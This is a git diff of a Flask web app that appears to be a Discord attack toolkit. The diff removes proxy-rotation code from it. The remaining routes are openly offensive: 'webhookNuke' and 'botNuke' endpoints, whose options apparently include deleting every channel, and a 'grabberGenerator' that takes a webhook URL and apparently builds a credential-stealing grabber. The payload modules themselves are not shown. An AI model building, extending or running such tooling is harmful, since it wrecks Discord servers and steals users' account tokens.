@@ -1,8 +1,7 @@
 import subprocess, threading, traceback, requests, shutil, string, random, py7zr, sys, os
-import discordWebhook, discordBot, Proxy
+import discordWebhook, discordBot
 from flask import Flask, request, redirect, render_template
 
-proxy = Proxy.Proxy("proxy.txt")
 app = Flask(__name__)
 
 def getIpAddresses():
@@ -24,23 +23,11 @@ def getIpAddresses():
 
 @app.route("/")
 def index():
-    proxy.getProxy()
     return render_template("index.html", ip=getIpAddresses())
 
 @app.route("/tools")
 def tools():
     return render_template("tools.html")
-
-@app.route("/settingProxy", methods=["GET", "POST"])
-def settingProxy():
-    if request.method == "POST":
-        proxyUrl = request.form["proxyUrl"]
-        if proxy.setProxy(proxyUrl):
-            return render_template("settingProxy.html", success="プロキシの設定が成功しました")
-        else:
-            return render_template("settingProxy.html", error="入力したプロキシは有効でありません")
-    return render_template("settingProxy.html")
-
 @app.route("/getDiscordWebhookLog", methods=["GET"])
 def getDiscordWebhookLog():
     if request.args.get("id") in discordWebhook.logs:
@@ -56,7 +43,6 @@ def stopDiscordWebhook():
 @app.route("/webhookNuke", methods=["GET", "POST"])
 def webhookNuke():
     if request.method == "POST":
-        proxy.getProxy()
         logId = "".join(random.choice(string.ascii_lowercase) for _ in range(12))
         
         webhookUrls = request.form["webhookUrls"].split("\r\n")
@@ -85,7 +71,6 @@ def stopDiscordBot():
 @app.route("/botNuke", methods=["GET", "POST"])
 def botNuke():
     if request.method == "POST":
-        proxy.getProxy()
         logId = "".join(random.choice(string.ascii_lowercase) for _ in range(12))
         discordBot.logs[logId] = "Start Pman Nuke PPP\n\n"
         
@@ -116,7 +101,6 @@ AllChannelDelete:{allChannelDelete}
 @app.route("/grabberGenerator", methods=["GET", "POST"])
 def grabberGenerator():
     if request.method == "POST":
-        proxy.getProxy()
         try:
             randomStr = "".join(random.choice(string.ascii_lowercase) for _ in range(12))
             webhookUrl = request.form["webhookUrl"]
